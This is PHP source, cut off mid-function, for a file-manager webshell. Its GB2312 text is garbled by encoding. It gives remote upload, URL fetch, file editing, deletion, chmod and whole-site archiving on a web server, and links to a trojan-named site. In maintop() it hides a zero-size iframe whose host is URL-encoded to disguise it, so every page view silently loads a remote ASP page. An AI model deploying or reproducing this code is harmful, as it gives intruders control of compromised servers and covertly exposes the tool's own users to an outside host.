<?php
header('Content-Type: text/html; charset=GB2312');
session_start();
$filefolder = "./";
$sitetitle = 'С̫Webshellɱ';//ñ
$safe_num = 0;
$meurl = $_SERVER['PHP_SELF'];
$me = end(explode('/',$meurl));
if(isset($_REQUEST['op'])){
$op = $_REQUEST['op'];
}else{
$op = 'home';
}
if(isset($_REQUEST['folder'])){
$folder = $_REQUEST['folder'];
}else{
$folder = '';
}
$arr = str_split($folder);
if($arr[count($arr)-1]!=='/'){
    $folder .= '/';
}
while (preg_match('/\.\.\//',$folder)) $folder = preg_replace('/\.\.\//','/',$folder);
while (preg_match('/\/\//',$folder)) $folder = preg_replace('/\/\//','/',$folder);
if ($folder == '') {
    $folder = $filefolder;
}elseif ($filefolder != '') {
    if (!@ereg($filefolder,$folder)) {
        $folder = $filefolder;
    }  
}
$ufolder = $folder;
if(@$_SESSION['error'] > $safe_num && $safe_num !== 0){
printerror('ѾƵ½');
}
if (@$_COOKIE['user'] != $user || @$_COOKIE['pass'] != md5($pass)) {
if (@$_REQUEST['user'] == $user && @$_REQUEST['pass'] == $pass) {
    setcookie('user',$user,time()+60*60*24*1);
    setcookie('pass',md5($pass),time()+60*60*24*1);
} else {
if (@$_REQUEST['user'] == $user || @$_REQUEST['pass']) $er = true;
login(@$er);
}
}
function maintop($title,$showtop = true) {
# ȫֱ
    global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;
    echo "<html>\n<head>\n"
        ."<title>$sitetitle - $title</title>\n"
        ."</head>\n"
        ."<body>\n"
        ."<style>\n*{font-family:Verdana, 'Microsoft Yahei' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color:#333;text-decoration: none;}a:hover {color:#666;text-decoration: none;}a:link {color:#333;text-decoration: none;}a:active {color:#666;text-decoration: none;}table,form{width:700px !important;max-width:700px !important;}textarea{font-family:'Yahei Consolas Hybrid',Consolas,Verdana, Tahoma, Arial, Helvetica,'Microsoft Yahei', sans-serif !important;border:1px solid #ccc;margin:5px 0;padding:8px;line-height:18px;width:700px;max-width:700px;border-radius:2px;}input.button{margin:5px 0;font-size:13px;*font-size:90%;*overflow:visible;padding:4px 10px;;color:#fff !important;color: white !important;*color:#fff !important;border:1px solid #fff;border:0 rgba(0,0,0,0);background-color:#666;text-decoration:none;border-radius:2px}input.button:hover{filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#1a000000', GradientType=0);background-image:-webkit-gradient(linear,0 0,0 100%,from(transparent),color-stop(40%,rgba(0,0,0,.05)),to(rgba(0,0,0,.1)));background-image:-webkit-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05) 0,rgba(0,0,0,.1));background-image:-o-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));text-decoration: none}input.buuton:active{box-shadow:0 0 0 1px rgba(0,0,0,.15) inset,0 0 6px rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-radius:2px;}body{;background-color:#ededed;margin: 0px 0px 10px;}.title{font-weight: bold; FONT-SIZE: 12px;text-align: center;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{border-top:1px solid #999;border-bottom:1px solid #999;font-size:13px;padding:5px;margin-bottom:15px;}.menu a{text-decoration:none;margin-right:8px;}.table{background-color:#777;color:#fff;}.mytable tr:hover{background:#ededed;color:#469;font-size:13px;}.table:hover{background-color:#777 !important;color:#fff !important}tr{height:26px;}.upload{width:400px;}\n</style>\n";
    if ($viewing == "") {#TableĿʼ
        echo "<table cellpadding=10 cellspacing=10 bgcolor=#ededed align=center><tr><td>\n"
            ."<table cellpadding=1 cellspacing=1><tr><td>\n"
            ."<table cellpadding=5 cellspacing=5 bgcolor='white'><tr><td>\n";
    }else{
        echo "<table cellpadding=7 cellspacing=7 bgcolor='white'><tr><td>\n";
    }
    echo "<h2>$sitetitle <small>- $title</small></h2>\n";
    if ($showtop) {//ͷ˵
        echo "<div class=\"menu\">\n"
            ."<a href=\"".$meurl."?op=home\" $iftop>ҳ</a>\n"
            ."<a href=\"".$meurl."?op=up\" $iftop>ϴ</a>\n"
            ."<a href=\"".$meurl."?op=cr\" $iftop></a>\n"
            ."<a href=\"".$meurl."?op=allz\" $iftop>ȫվ</a>\n"
            ."<a href=\"".$meurl."?op=sqlb\" $iftop>ݿⱸ</a>\n"
            ."<a href=\"".$meurl."?op=ftpa\" $iftop>FTP</a>\n"
            ."<a href=\"".$url."http://www.asp-muma.com\" $iftop>뱾</a>\n"
            ."<a href=\"".$meurl."?op=logout\" $iftop>˳</a>\n"
            ."<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\n"
            ."</div>";
    }
}
/****************************************************************/
/* function login()                                             */
/*                                                              */
/* ¼֤ $user and md5($pass)                                */
/* Ҫ֧Cookie                                         */
/****************************************************************/
function login($er=false) {
    global $meurl,$op,$safe_num,$mail;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);
    maintop("¼",false);
    if ($er) { 
        if (isset($_SESSION['error'])){
            $_SESSION['error']++;
            if($_SESSION['error'] > $safe_num && $safe_num !== 0){
                @mail($mail,'ѣļ¼','ļ<br>¼IPΪ'.$_SERVER['REMOTE_ADDR'],'From: <i@hezii.pw>');
                printerror('ѾƵ½');
            }
        }else{
            $_SESSION['error'] = 1;
        }
        echo "<span class=error>**ʾ: **</span><br><br>\n"; 
    }
    echo "<form action=\"".$meurl."?op=".$op."\" method=\"post\">\n"
        ."<input type=\"text\" name=\"user\" border=\"0\" class=\"text\" value=\"".@$user."\"  placeholder=\"û\">\n"
        ."<input type=\"password\" name=\"pass\" border=\"0\" class=\"text\" value=\"".@$pass."\" placeholder=\"\"><br>\n"
        ."<input type=\"submit\" name=\"submitButtonName\" value=\"¼\" border=\"0\" class=\"button\">\n"
        ."</form>\n";
    mainbottom();
}
/****************************************************************/
/* function home()                                              */
/*                                                              */
/* Main function that displays contents of folders.             */
/****************************************************************/
function home() {
    global $meurl ,$folder, $ufolder,$filefolder, $HTTP_HOST;
    maintop("ҳ");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=100% class='mytable'><form method='post'>\n";
    $content1 = "";
    $content2 = "";
    $count = "0";
    $folder = iconv("UTF-8", "GBK", $folder);
    $style = opendir($folder);
    $a=1;
    $b=1;
    if ($folder) {
        $_SESSION['folder']=$ufolder;
    }
    while($stylesheet = readdir($style)) {
    if ($stylesheet !== "." && $stylesheet !== ".." ) {
        if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) {
            $sstylesheet = $stylesheet;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $ulfolder = $folder;
            $folder = iconv("GBK", "UTF-8", $folder);
            $content1[$a] = "<tr width=100%><td><input name='select_item[d][$stylesheet]' type='checkbox' id='$stylesheet' onclick='One($stylesheet)' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$meurl."?op=home&folder=".$folder.$stylesheet."/\">".$stylesheet."</a></td>\n"
                           ."<td>".Size(dirSize($folder.$stylesheet))."</td>"
                           ."<td><a href=\"".$meurl."?op=home&folder=".htmlspecialchars($folder.$stylesheet)."/\"></a></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\"></a></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>鿴</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</td></tr>\n";
            $a++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }elseif(!is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)){ 
        if(preg_match ("/.zip$/i", $folder.$stylesheet)){#жǷzipļ
            $sstylesheet = $stylesheet;
            $ulfolder = $folder;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $folder = iconv("GBK", "UTF-8", $folder);
            $content2[$b] = "<tr width=100%><td><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>".$stylesheet."</a></td>\n"
                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"
                           ."<td></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\"></a></td>\n"
                           ."<td><a href=\"".$meurl."?op=unz&dename=".htmlspecialchars($stylesheet)."&folder=$folder\">ȡ</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\n";
            $b++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }else{
            $sstylesheet = $stylesheet;
            $ulfolder = $folder;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $folder = iconv("GBK", "UTF-8", $folder);
            $content2[$b] = "<tr width=100%><td><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>".$stylesheet."</a></td>\n"
                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"
                           ."<td><a href=\"".$meurl."?op=edit&fename=".htmlspecialchars($stylesheet)."&folder=$folder\">༭</a></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\"></a></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>鿴</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\n";
            $b++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }
    }
    $count++;
    } 
}
    closedir($style);
    echo "Ŀ¼: $ufolder\n"
         ."<br>ļ: " . $count . "<br><br>";
    echo "<tr class='table' width=100%>"
        ."<script>function Check() {
            var collid = document.getElementById(\"check\")
            var coll = document.getElementsByTagName('input')
            if (collid.checked){
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = true;
            }else{
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = false;
            }
         }</script>"
       ."<td width=20></td>\n"
       ."<td>ļ</td>\n"
       ."<td width=65>С</td>\n"
       ."<td width=45></td>\n"
       ."<td width=55></td>\n"
       ."<td width=45>鿴</td>\n"
       ."<td width=30>Ȩ</td>\n"
       ."</tr>";
    if($ufolder!=="./"){
        $count = substr_count($ufolder,"/");
        $last = explode('/', $ufolder);
        $i = 1;
        $back = ".";
        while($i < $count-1){
              $back = $back."/".$last[$i];
              $i++;
        }
        echo "<tr width=100%><td></td><td><a href=\"".$meurl."?op=home&folder=".$back."/"."\">ϼĿ¼</a></td><td></td><td></td><td></td><td></td><td></td></tr>";
    }
    for ($a=1; $a<count($content1)+1;$a++) {
        $tcoloring   = ($a % 2) ? '#DEDEDE' : '#ededed';
        if(empty($content1)){
        }else{
            echo @$content1[$a];
        }
    }
    for ($b=1; $b<count($content2)+1;$b++) {
        $tcoloring   = ($a++ % 2) ? '#DEDEDE' : '#ededed';
        echo @$content2[$b];
    }
    echo "</table><div><input type=\"checkbox\" id=\"check\" onclick=\"Check()\"> <input class='button' name='action' type='submit' value='ƶ' /> <input class='button' name='action' type='submit' value='' /> <input class='button' name='action' type='submit' onclick=\"return confirm('ȷϺѡеļΪBackup-time.zip')\"  value='ѹ' /> <input class='button' name='action' type='submit' onclick=\"return confirm('Ҫɾѡеļ?')\" value='ɾ' /> <input class='button' name='action' type='submit' onclick=\"var t=document.getElementById('chmod').value;return confirm('ЩļȨ޸Ϊ'+t+'ļУݹļݣ')\" value='Ȩ' /> <input type=\"text\" class=\"text\" stlye=\"vertical-align:text-top;\" size=\"3\" id=\"chmod\" name=\"chmod\" value=\"0755\"></div></form>";
    mainbottom();
}
// ļдСĺ
    function dirSize($directoty){
    $dir_size=0;
    if($dir_handle=@opendir($directoty))
    {
    while($filename=readdir($dir_handle)){
    $subFile=$directoty.DIRECTORY_SEPARATOR.$filename;
    if($filename=='.'||$filename=='..'){
    continue;
    }elseif (is_dir($subFile))
    {
    $dir_size+=dirSize($subFile);
    }elseif (is_file($subFile)){
    $dir_size+=filesize($subFile);
    }
    }
    closedir($dir_handle);
    }
    return ($dir_size);
    }
    // ļСĺ
    function Size($size){
            if($size < 1024){
                $filesize = $size;
            }elseif($size > 1024 and $size < 1024*1024){
                $count1 = round($size/1024,1);
                $filesize = $count1."k";
            }elseif($size > 1024*1024 and $size < 1024*1024*1024){
                $count1 = round($size/1024/1024,1);
                $filesize = $count1."M";
            }elseif($size > 1024*1024*1024 and $size < 1024*1024*1024*1024){
                $count1 = round($size/1024/1024/1024,1);
                $filesize = $count1."G";
            }elseif($size > 1024*1024*1024*1024){
                $count1 = round($size/1024/1024/1024/1024,1);
                $filesize = $count1."T";
            }
            return $filesize;
        }
function curl_get_contents($url)   
{   
    $ch = curl_init();   
    curl_setopt($ch, CURLOPT_URL, $url);            //÷ʵurlַ   
    //curl_setopt($ch,CURLOPT_HEADER,1);            //ǷʾͷϢ   
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);           //óʱ
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);      //301   
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        //ؽ   
    $r = curl_exec($ch);   
    curl_close($ch);   
    return $r;   
}
function up() {
    global $meurl, $folder, $content, $filefolder;
    maintop("ϴ");
    echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"".$meurl."?op=upload\" METHOD=\"POST\">\n"
        ."<h3>ϴ</h3>ϴ".ini_get('upload_max_filesize')."ļ<br><input type=\"File\" name=\"upfile[]\" multiple size=\"20\">\n"
        ."<input type=\"text\" name=\"ndir\" value=\"".$_SESSION["folder"]."\" class=\"upload\">\n";
    echo $content
        ."</select><br>"
        ."<input type=\"submit\" value=\"ϴ\" class=\"button\">\n"
        ."<script>function UpCheck(){if(document.getElementById(\"unzip\").checked){document.getElementById(\"deluzip\").disabled=false}else{document.getElementById(\"deluzip\").disabled=true}}</script>"
        ."<input type=\"checkbox\" name=\"unzip\" id=\"unzip\" value=\"checkbox\" onclick=\"UpCheck()\" checked><label for=\"unzip\"><abbr title='ȡѹϴZipѹļ'>ѹ</abbr></labal> "
        ."<input type=\"checkbox\" name=\"delzip\" id=\"deluzip\"value=\"checkbox\"><label for=\"deluzip\"><abbr title='ͬʱϴѹļɾ'>ɾ</abbr></labal>"
        ."</form>\n";
    echo "<h3>Զϴ</h3>Զϴʲô˼<br>ԶϴǴȡļֱصǰһֹܡ<br>SSHWgetܣȥֶϴ˷ѵʱ䡣<br><br><form action=\"".$meurl."?op=yupload\" method=\"POST\"><input name=\"url\" size=\"85\" type=\"text\" class=\"text\" placeholder=\"ļַ...\"/> <input type=\"text\" class=\"text\" size=\"20\" name=\"ndir\" value=\"".$_SESSION["folder"]."\">"
         ."<input name=\"submit\" value=\"ϴ\" type=\"submit\" class=\"button\"/>\n"
         ."<script>function Check(){if(document.getElementById(\"un\").checked){document.getElementById(\"del\").disabled=false}else{document.getElementById(\"del\").disabled=true}}</script>"
         ."<input type=\"checkbox\" name=\"unzip\" id=\"un\" value=\"checkbox\" onclick=\"Check()\" checked><label for=\"un\"><abbr title='ȡѹϴZipѹļ'>ѹ</abbr></labal> "
         ."<input type=\"checkbox\" name=\"delzip\" id=\"del\"value=\"checkbox\"><label for=\"del\"><abbr title='ͬʱϴѹļɾ'>ɾ</abbr></labal></form>";
    mainbottom();
}
function yupload($url, $folder, $unzip, $delzip) {
global $meurl;
    $nfolder = $folder;
    $url = iconv("UTF-8", "GBK", $url);
    $folder = iconv("UTF-8", "GBK", $folder);
    if($url!==""){
        set_time_limit (24 * 60 * 60); // óʱʱ
      if (!file_exists($folder)){
        mkdir($folder, 0755);
        }
    $newfname = $folder . basename($url); // ȡļ
    if(function_exists('curl_init')){
    $file = curl_get_contents($url);
    file_put_contents($newfname,$file);
    }else{
        $file = fopen ($url, "rb"); // Զļģʽ
        if ($file) { // سɹ
            $newf = fopen ($newfname, "wb");
        if ($newf) // ļɹ
            while (!feof($file)) { // жϸдǷ
            fwrite($newf, fread($file, 1024 * 8), 1024 * 8); // ûдͼ
            }
        }
        if ($file) {
            fclose($file); // رԶļ
        }
        if ($newf) {
            fclose($newf); // رձļ
        }
    }
    maintop("Զϴ");
    echo "ļ ".basename($url)." ϴɹ<br>\n";
    if(end(explode('.', basename($url)))=="zip" && isset($unzip) && $unzip == "checkbox"){
        if(class_exists('ZipArchive')){
            $zip = new ZipArchive();
            if ($zip->open($folder.basename($url)) === TRUE) {
                $zip->extractTo($folder);
                $zip->close();
                echo basename($nurl)." Ѿѹ$nfolder<br>";
                if(isset($delzip) && $delzip == "checkbox"){
                if(unlink($folder.basename($url))){
                    echo basename($url)." ɾɹ<br>";
                    }else{
                    echo basename($url)." ɾʧ<br>";
                }
                    echo " <a href=\"".$meurl."?op=home&folder=".$folder."\">ļ</a>  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>   <a href=\"".$meurl."?op=up\">ϴ</a>\n";
                }
            }else{
                echo('<span class="error">޷ѹļ'.$nfolder.basename($nurl).'</span><br>');
            }
        }else{
        echo('<span class="error">˷ϵPHP֧ZipArchive޷ѹļ</span><br>');
        }
    }else{
    echo " <a href=\"".$meurl."?op=home&folder=".$nfolder."\">ļ</a>  <a href=\"".$meurl."?op=edit&fename=".basename($url)."&folder=".$nfolder."\">༭ļ</a>  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>   <a href=\"".$meurl."?op=up\">ϴ</a>\n";
    }
    mainbottom();
    return true;
    }else{
    printerror ('ļַΪա');
    }
}
function upload($upfile,$ndir,$unzip,$delzip) {
    global $meurl, $folder;
    $nfolder = $folder;
    $nndir = $ndir;
    $ndir = iconv("UTF-8", "GBK", $ndir);
    if (!$upfile) {
        printerror("ûѡļ");
    }elseif($upfile) { 
      maintop("ϴ");
  if (!file_exists($ndir)){
    mkdir($ndir, 0755);
    }
    $i = 1;
    while (count($upfile['name']) >= $i){
    $dir = iconv("UTF-8", "GBK", $nndir.$upfile['name'][$i-1]);
        if(@copy($upfile['tmp_name'][$i-1],$dir)) {
            echo "ļ ".$nndir.$upfile['name'][$i-1]." ϴɹ\n<br>";
            if(end(explode('.', $upfile['name'][$i-1]))=="zip" && isset($unzip) && $unzip == "checkbox"){
            if(class_exists('ZipArchive')){
                    $zip = new ZipArchive();
                    if ($zip->open($dir) === TRUE) {
                        $zip->extractTo($ndir);
                        $zip->close();
                        echo $upfile['name'][$i-1]." Ѿѹ$nndir<br>";
                        if(isset($delzip) && $delzip == "checkbox"){
                        if(unlink($folder.$upfile['name'][$i-1])){
                            echo $upfile['name'][$i-1]." ɾɹ<br>";
                            }else{
                                echo $upfile['name'][$i-1].("<span class=\"error\">ɾʧܣ</span><br>");
                            }
                        }
                    }else{
                        echo("<span class=\"error\">޷ѹļ".$nndir.$upfile['name'][$i-1]."</span><br>");
                    }
                }else{
                echo("<span class=\"error\">˷ϵPHP֧ZipArchive޷ѹļ</span><br>");
                }
            }
        }else{
            echo("<span class=\"error\">ļ ".$upfile['name'][$i-1]." ϴʧ</span><br>");
        }
        $i++;
    }
        echo " <a href=\"".$meurl."?op=home&folder=".$ndir."\">ļ</a>  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>  <a href=\"".$meurl."?op=up\">ϴ</a>\n";
        mainbottom();
    }else{
        printerror("ûѡļ");
    }
}
function allz() {
global $meurl;
    maintop("ȫվ");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<span class='error'>**: ⽫ȫվallbackup.zipĶ! ڸļļ!**</span><br><br>\n"
        ."ȷҪȫվ?<br><br>\n"
        ." <a href=\"".$meurl."?op=allzip\">Ѿ˽òɵĺȷʹ</a>  \n"
        ."<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n"
        ."</table>\n";
    mainbottom();
}
function allzip() {
global $meurl;
    if(class_exists('ZipArchive')){
    maintop("ȫվ");
        if (file_exists('allbackup.zip')) {
            unlink('allbackup.zip'); 
        }
        class Zipper extends ZipArchive {
            public function addDir() {
                $dr = opendir('./');
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8", $node);
                    echo $nnode.'<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
            public function addDir2($path) {
            $npath = iconv("GBK", "UTF-8", $path);
                $this->addEmptyDir($path);
                $dr = opendir($path.'/');
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $path.'/'.$file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8", $node);
                    echo $nnode.'<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
        }
        $zip = new Zipper;
        $res = $zip->open('allbackup.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $zip->addDir();
            $zip->close();
            echo 'ȫվѹɣ'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }else{
            echo '<span class="error">ȫվѹʧܣ</span>'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }
        mainbottom();
    }else{
    printerror('˷ϵPHP֧ZipArchive޷ѹļ');
    }
}
function unz($dename) {
    global $meurl, $folder, $content, $filefolder;
    if (!$dename == "") {
        maintop("ѹ");
        echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
            ."<span class=error>**: ⽫ѹ ".$folder.$dename.". **</span ><br><br>\n"
            ."<form ENCTYPE=\"multipart/form-data\" action=\"".$meurl."?op=unzip\">ѹ..."
            ."<input type=\"text\" name=\"ndir\" class=\"text\" value=\"".$_SESSION['folder']."\">";
        echo $content
            ."</select>"
            ."<br><br>ȷҪѹ ".$folder.$dename."?<br><br>\n"
            ."<input type=\"hidden\" name=\"op\" value=\"unzip\">\n"
            ."<input type=\"hidden\" name=\"dename\" value=\"".$dename."\">\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
            ."<input type=\"submit\" value=\"ѹ\" class=\"button\"><input type=\"checkbox\" name=\"del\" id=\"del\"value=\"del\"><label for=\"del\">ͬʱɾѹļ</label><br><br>\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n"
            ."</table>\n";
        mainbottom();
    }else{
        home();
    }
}
function unzip($dename,$ndir,$del) {
    global $meurl, $folder;
    $nndir = $ndir;
    $nfolder = $folder;
    $ndename = $dename;
    $dename = iconv("UTF-8", "GBK", $dename);
    $folder = iconv("UTF-8", "GBK", $folder);
    $ndir = iconv("UTF-8", "GBK", $ndir);
    if (!$dename == "") {
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        if(class_exists('ZipArchive')){
            $zip = new ZipArchive();
            if ($zip->open($folder.$dename) === TRUE) {
                $zip->extractTo($ndir);
                $zip->close();
                maintop("ѹ");
                echo $dename." Ѿѹ $nndir<br>";
                if($del=='del'){
                unlink($folder.$dename);
                echo $ndename." Ѿɾ<br>";
                }
                echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
                mainbottom();
            }else{
                printerror('޷ѹļ'.$nfolder.$ndename);
            }
        }else{
        printerror('˷ϵPHP֧ZipArchive޷ѹļ');
        }
    }else{
        home();
    }
}
function deltree($pathdir)  
{  
if(is_empty_dir($pathdir))//ǿյ  
    {  
    rmdir($pathdir);//ֱɾ  
    }  
    else  
    {//Ŀ¼...  
        $d=dir($pathdir);  
        while($a=$d->read())  
        {  
        if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){unlink($pathdir.'/'.$a);}  
        //ļֱɾ  
        if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..'))  
        {//Ŀ¼  
            if(!is_empty_dir($pathdir.'/'.$a))//ǷΪ  
            {//ǣԭ·+¼Ŀ¼  
            deltree($pathdir.'/'.$a);  
            }  
            if(is_empty_dir($pathdir.'/'.$a))  
            {//ǿվֱɾ  
            rmdir($pathdir.'/'.$a);
            }
        }  
        }  
        $d->close();  
    }  
}  
function is_empty_dir($pathdir)  
{ 
//жĿ¼ǷΪ 
    $d=opendir($pathdir);  
    $i=0;  
    while($a=readdir($d)){  
        $i++;  
    }  
    closedir($d);  
    if($i>2){return false;}  
    else return true;  
    }
function edit($fename) {
    global $meurl,$folder;
    $file = iconv("UTF-8", "GBK", $folder.$fename);
    if (file_exists($folder.$fename)) {
        maintop("༭");
        echo $folder.$fename;
        $contents = file_get_contents($file);
        $encode = mb_detect_encoding($contents);
        if($encode!=="UTF-8"){
            $contents = iconv("UTF-8", $encode, $contents);
        }
        echo "<form action=\"".$meurl."?op=save&encode=".$encode."\" method=\"post\">\n"
            ."<textarea cols=\"73\" rows=\"40\" name=\"ncontent\">\n";
        echo htmlspecialchars($contents);
        echo "</textarea>\n"
            ."<br>\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
            ."<input type=\"hidden\" name=\"fename\" value=\"".$fename."\">\n"
            ."<input type=\"submit\" value=\"\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n"
            ."</form>\n";
        mainbottom();
    }else{
        home();
    }
}
function save($ncontent, $fename, $encode) {
    global $meurl,$folder;
    if (!$fename == "") {
    maintop("༭");
    $file = iconv("UTF-8", "GBK", $folder.$fename);
    $ydata = stripslashes($ncontent);
    if($encode!=="UTF-8"){
    $ydata = iconv($encode, "UTF-8", $ydata);
    }
    if(file_put_contents($file, $ydata)) {
        echo "ļ <a href=\"".$folder.$fename."\" target=\"_blank\">".$folder.$fename."</a> ɹ\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>  <a href=\"".$meurl."?op=edit&fename=".$fename."&folder=".$folder."\">༭</a>\n";
        $fp = null;
    }else{
        echo "<span class='error'>ļ</span>\n"
        ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
    }
    mainbottom();
    }else{
    home();
    }
}
function cr() {
    global $meurl, $folder, $content, $filefolder;
    maintop("");
    if (!$content == "") { echo "<br><br>һ.\n"; }
    echo "<form action=\"".$meurl."?op=create\" method=\"post\">\n"
        ."ļ<br><input type=\"text\" size=\"20\" name=\"nfname\" class=\"text\"><br><br>\n"
        ."ĿĿ¼<br><input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\">";
    echo $content
        ."</select><br><br>";
    echo "ļ <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"0\" checked><br>\n"
        ."Ŀ¼ <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"1\"><br><br>\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"$folder\">\n"
        ."<input type=\"submit\" value=\"\" class=\"button\">  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n"
        ."</form>\n";
    mainbottom();
}
function create($nfname, $isfolder, $ndir) {
    global $meurl, $folder;
    if (!$nfname == "") {
        maintop("");
        $ndir = iconv("UTF-8", "GBK", $ndir);
        $nfname = iconv("UTF-8", "GBK", $nfname);
    if ($isfolder == 1) {
        if(@mkdir($ndir."/".$nfname, 0755)) {
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "Ŀ¼<a href=\"".$meurl."?op=home&folder=./".$nfname."/\">".$ndir.$nfname."/</a> Ѿɹ.\n"
            ."<br><a href=\"".$meurl."?op=home&folder=".$ndir.$nfname."/\">ļ</a> | <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }else{
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "<span class='error'>Ŀ¼".$ndir."".$nfname." ܱĿ¼ȨǷѾΪд  Ŀ¼ǷѾ</span>\n";
        }
    }else{
        if(@fopen($ndir."/".$nfname, "w")) {
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "ļ, <a href=\"".$meurl."?op=viewframe&file=".$nfname."&folder=$ndir\">".$ndir.$nfname."</a> Ѿɹ\n"
                ."<br><a href=\"".$meurl."?op=edit&fename=".$nfname."&folder=".$ndir."\">༭ļ</a> | <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">ļ</a>\n";
        }else{
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "<span class='error'>ļ ".$ndir.$nfname." ܱĿ¼ȨǷѾΪд  ļǷѾ</span>\n";
        }
    }
    mainbottom();
    }else{
    cr();
    }
}
function ren($file) {
    global $meurl,$folder,$ufolder;
    $ufile = $file;
    if (!$file == "") {
        maintop("");
        echo "<form action=\"".$meurl."?op=rename\" method=\"post\">\n"
